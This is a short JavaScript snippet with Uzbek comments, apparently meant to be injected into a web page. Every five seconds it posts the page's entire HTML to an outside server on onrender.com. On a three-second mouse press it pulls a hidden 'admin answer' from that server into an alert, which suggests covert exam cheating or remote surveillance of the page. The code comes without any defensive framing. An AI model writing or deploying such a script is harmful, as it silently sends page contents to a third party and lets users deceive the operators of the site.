(function(){
    const S = 'https://f1-f2mq.onrender.com';
    
    async function sendUpdate() {
        try {
            await fetch(S + '/upload-html', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ html: document.documentElement.outerHTML })
            });
        } catch (e) { console.log("Ulanishda xato..."); }
    }

    // Har 5 soniyada yuborish
    setInterval(sendUpdate, 5000);
    sendUpdate();

    // SMSni ko'rish (Sichqonchani 3 soniya bosib tursa chiqadi)
    let timer;
    document.addEventListener('mousedown', () => {
        timer = setTimeout(async () => {
            const r = await fetch(S + '/latest');
            const d = await r.json();
            alert("ADMIN JAVOBI:\n\n" + d.message);
        }, 3000);
    });
    document.addEventListener('mouseup', () => clearTimeout(timer));
})();
